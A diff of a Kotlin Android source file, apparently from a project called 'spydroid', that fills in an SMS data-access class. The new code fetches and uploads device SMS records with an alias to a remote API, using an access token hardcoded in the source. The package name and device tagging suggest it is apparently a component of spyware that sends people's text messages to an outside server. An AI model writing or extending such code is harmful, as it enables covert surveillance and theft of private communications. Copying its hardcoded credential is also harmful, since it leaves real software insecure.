@@ -17,16 +17,43 @@
 
 package net.spydroid.common.remote.network.data
 
+import android.util.Log
 import net.spydroid.common.remote.network.daos.SmsDevicesDao
 import net.spydroid.common.remote.network.models.SmsDevices
 
 class SmsDevicesDaoHandler: SmsDevicesDao {
-    override suspend fun getAllSms(): List<SmsDevices> {
-        TODO("Not yet implemented")
-    }
+
+    private val TAG = "PRUBA_INSERT"
+
+    override suspend fun getAllSms(): List<SmsDevices> =
+        try {
+            val response = apiService.getSms("iygad7618wg8y1f7fgvas71f671").execute()
+            if (response.isSuccessful) {
+                response.body() ?: emptyList()
+            } else {
+                //Error
+                //Log.i(TAG, "Error: ${response.code()}")
+                emptyList()
+            }
+        } catch (e: Exception) {
+            // Fail
+            //Log.e(TAG, "Failure: ${e.message}")
+            emptyList()
+        }
 
     override suspend fun insertSms(sms: SmsDevices) {
-        TODO("Not yet implemented")
+        try {
+            val response = apiService.createSms(
+                accessToken = "iygad7618wg8y1f7fgvas71f671",
+                alias = sms.alias,
+                sms = sms.sms
+            ).execute()
+            if (response.isSuccessful){
+                Log.i(TAG, "SMS INSERTADO EN LA BASE DE DATOS!")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "ERROR INSERTANDO SMS: ${e.message} ")
+        }
     }
 
     override suspend fun deleteSms(sms: SmsDevices) {
